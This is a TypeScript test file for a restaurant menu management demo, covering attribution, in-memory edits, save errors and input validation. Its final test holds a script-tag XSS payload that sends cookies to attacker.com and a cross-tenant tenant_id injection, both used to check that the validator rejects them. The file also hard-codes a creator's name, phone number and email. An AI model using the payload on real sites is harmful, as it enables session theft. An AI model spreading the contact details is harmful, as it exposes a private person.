import test from "node:test";
import assert from "node:assert/strict";
import { validateMenuItemUpdate } from "../src/services/menuValidation.ts";
import { MANAGEMENT_DEMO_ATTRIBUTION } from "../src/types/business.ts";
import type { MenuItemContract, MenuCategoryContract } from "../src/types/business.ts";

test("Portfolio Attribution: Creator Details & Labels Are Preserved", () => {
  const { creator, sampleLabels } = MANAGEMENT_DEMO_ATTRIBUTION;

  assert.equal(creator.name, "Susmit Dey");
  assert.equal(creator.phone, "+91 9007801474");
  assert.equal(creator.email, "susmitdey047@gmail.com");
  assert.equal(sampleLabels.title, "Business Management System — Concept Demo");
  assert.equal(sampleLabels.tagline, "A portfolio project by Susmit Dey");
});

test("Simulation Mode: Operates on Isolated In-Memory State Without Leaking", () => {
  const sampleCategories: MenuCategoryContract[] = [
    {
      id: "beverages",
      label: "Coffee & Beverages",
      groups: [
        {
          title: "Cold Coffee & Shakes",
          items: [
            { name: "Classic Cold Coffee", price: "109", veg: true, available: true },
          ],
        },
      ],
    },
  ];

  // Deep clone initial menu categories
  const localCategories: MenuCategoryContract[] = JSON.parse(JSON.stringify(sampleCategories));

  // Find "Classic Cold Coffee"
  const beverageCat = localCategories.find((c) => c.id === "beverages");
  assert.ok(beverageCat, "Beverages category must exist");

  const shakesGroup = beverageCat.groups.find((g) => g.title === "Cold Coffee & Shakes");
  assert.ok(shakesGroup, "Cold Coffee group must exist");

  const coldCoffee = shakesGroup.items.find((i) => i.name === "Classic Cold Coffee");
  assert.ok(coldCoffee, "Classic Cold Coffee must exist");
  assert.equal(coldCoffee.price, "109");

  // Simulate updating price in memory
  coldCoffee.price = "125";
  coldCoffee.available = false; // 86'd

  // Verify that the local clone updated
  assert.equal(coldCoffee.price, "125");
  assert.equal(coldCoffee.available, false);

  // Verify original source array remains unpolluted
  const originalItem = sampleCategories[0].groups[0].items[0];
  assert.equal(originalItem.price, "109", "Original static data must not be mutated");
  assert.equal(originalItem.available ?? true, true, "Original static data must remain unchanged");
});

test("Error Handling: Never Falls Back Silently on Failed Live Save", async () => {
  // Simulate live save handler when Supabase client is unconfigured or returns an error
  const mockLiveSave = async (
    isConfigured: boolean
  ): Promise<{ success: boolean; error?: string }> => {
    if (!isConfigured) {
      return {
        success: false,
        error: "Supabase client is not configured with valid environment variables.",
      };
    }
    return { success: true };
  };

  const failureResult = await mockLiveSave(false);

  // Must explicitly return success: false with a descriptive error
  assert.equal(failureResult.success, false);
  assert.ok(
    failureResult.error?.includes("Supabase client is not configured"),
    "Must return clear error message rather than silently faking persistence"
  );
});

test("Menu Item Availability: One-Tap In-Stock and 86'd Toggle Logic", () => {
  const item: MenuItemContract = {
    name: "Veg Momo",
    price: "79",
    veg: true,
    available: true,
  };

  // Toggle to 86'd Out of Stock
  item.available = false;
  assert.equal(item.available, false);

  // Toggle back to In Stock
  item.available = true;
  assert.equal(item.available, true);
});

test("Validation Safeguards: Malicious Payload Rejected Before Reaching Database", () => {
  const maliciousXssPayload = {
    name: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>Hot Coffee",
    price: "45",
  };

  const validation = validateMenuItemUpdate(maliciousXssPayload);
  assert.equal(validation.success, true);
  // Script block must be stripped completely
  assert.equal(validation.data?.name, "Hot Coffee");
  assert.ok(!validation.data?.name.includes("<script>"));

  // Forbidden tenant_id injection
  const crossTenantPayload = {
    name: "Valid Coffee",
    price: "50",
    tenant_id: "attacker-tenant-uuid",
  };

  const crossTenantValidation = validateMenuItemUpdate(crossTenantPayload);
  assert.equal(crossTenantValidation.success, false);
  assert.ok(
    crossTenantValidation.errors.some((e) => e.includes("Forbidden: Changing 'tenant_id'")),
    "Cross-tenant injection must be caught by validation"
  );
});
